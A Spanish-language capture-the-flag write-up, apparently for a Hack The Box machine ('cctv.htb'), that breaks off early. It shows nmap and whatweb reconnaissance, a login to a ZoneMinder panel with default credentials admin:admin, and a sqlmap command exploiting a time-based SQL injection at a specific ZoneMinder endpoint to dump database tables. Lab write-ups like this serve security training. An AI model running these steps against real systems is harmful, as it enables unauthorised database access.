
# Reconocimiento

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.4.75 -oG allPorts
```

```shell
[*] IP Address: 10.129.4.75
[*] Open ports: 22,80
```

```shell
nmap -p22,80 -sCV 10.129.4.75 -oN targeted
```

## HTTP
Accedemos a través del navegador al servicio web que se encuentra desplegado
```url
http://cctv.htb/
```

Miramos que servicios usa la web usando [[WHATWEB]]
```shell
whatweb http://cctv.htb/
```

Sin encontrar mucha información relevante
Encontramos un botón en el cual pone *STAFF Login* accedemos a el encontrando un panel de login de `ZoneMinder Login`
![[Pasted image 20260309092553.png]]

Probamos acceder usando `admin::admin` consiguiendo acceder

Al buscar en internet vulnerabilidades sobre esta versión vemos alguna información sobre inyección de SQL basado en tiempo encontrando una URL en especifico
```url
zm/index.php?view=request&request=event&action=removetag&tid=1
```

Se lo pasaremos a  [[SQLMAP]] junto con las Cookies de session
```shell
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --dbms=MySQL -D zm --tables --cookie="ZMSESSID=d8r5lphmv7me167dp6hsm1711k" --batch
```

Obtenemos los datos de la base de datos, 